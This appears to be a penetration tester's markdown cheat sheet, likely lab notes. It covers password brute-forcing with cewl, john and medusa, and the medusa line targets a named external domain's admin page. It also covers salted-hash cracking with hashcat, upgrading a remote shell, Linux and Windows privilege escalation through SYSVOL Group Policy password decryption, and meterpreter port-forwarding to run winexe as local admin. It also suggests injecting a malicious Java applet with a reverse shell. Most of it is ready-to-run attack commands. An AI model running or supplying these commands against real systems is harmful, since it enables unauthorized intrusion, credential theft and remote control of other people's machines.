## UTILITIES
### dirbuster: brute-force website directories.
- find a login page
- generate word via `cwel`  
 ```cewl www.targetdomain.com -m 6 -w /root/target-dmoain-cewl.txt```
- use `john the ripper` to create mangled passwords list  
``` john --wordlist=/root/target-dmoain-cewl.txt --rules --stdout > mutated.txt ```
- pass the new password file to `medusa` for HTTP basci-auth brute force attach  
```  medusa -h fiprealty.com -u admin -P passwords.txt -M http -n 81 -m DIR:/admin -T 30  ```

### hash-identifier
Locate a password hash, and use `hash-identifier` to reveal the source/type.
> won't always work
- if the hash originates from a known app, you can investigate the app's source code to find how it was generated.
The source code might reveal that the hash was generated by `sha1` + 10 random digits...

### oclHashcat-plus
salt + hashed password cracker
- generate a passwords file
- make sure the 'split' the `hash:salt`, so the proggram can identify it
```
#salt of 10 digits
kjhgldskjhgbkjfgbhfdgbsdfg:yu34gy59p1
khgsjdgk865kn9gjrkjtyo9ujg:y689rkjhty
```
- use your `giant passwords list` (actual hashes:slat list) againt the new (wish to hack) list.
```
./hashcat64.bin -m 500 hash-and-salted-passwords.txt my-big-hashes-salted-ditionary.dict
```
- for more information: 
 - https://uwnthesis.wordpress.com/2013/08/07/kali-how-to-crack-passwords-using-hashcat/
 - https://uwnthesis.files.wordpress.com/2013/08/hashtypes.png?w=497&h=333

## WORDLISTS
- /usr/share/dirbuster/wordlists/directory-list....

## SHELL
few commands to allow us better control of our new remote shell.
```
# execute them in the following order (on every new shell)
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=linux
```

## GATHER INFORMATION
```
cat /etc/issue
uname -a
```
- locate `.htaccess` or any other related files that might indicate on another/internal/hidden network.
- locate `apache2` logs, they mightreveal more information about the webserver. a usage of java might be another way to exploit other users/services. (leading to client-side attack) we can add/alter the app code to push our maliciouse java applet with a reverse-shell payload.

## PRIVELEGDA ESCALATION
### LINUX
- `mempodipper`

### WINDOWS
- domain controller
 - enumerate the domain controller information
 - map the SYSVOL share to our client `net use z:\\dc01\SYSVOL`
 - search the folder for files `dir /s grups.xml` ...
 - find password/s in the file, and use `gpp-decrypt` to decrypt it
 - one the password is decrypted, we'll use `winexe` to execute remote commands as the local admin.
  - within our meterpreter session...
   - using `port-forwarding` will pass our `winexe` commands from our kali machine to the remote machine.
   - route add `destination-network class` 255.255.255.0 1
   - `route add 10.11.1.0 255.255.255.0 1`
   - `portfw add -l 445 -p 445 -r 10.7.0.22`
   - `portfw delete -l 445 -p 445 -r 10.7.0.22`
  - within our kali box
   - the following command is routed via our kali machine
   - `winexe -U username%password //127.0.0.1 "cmd"`



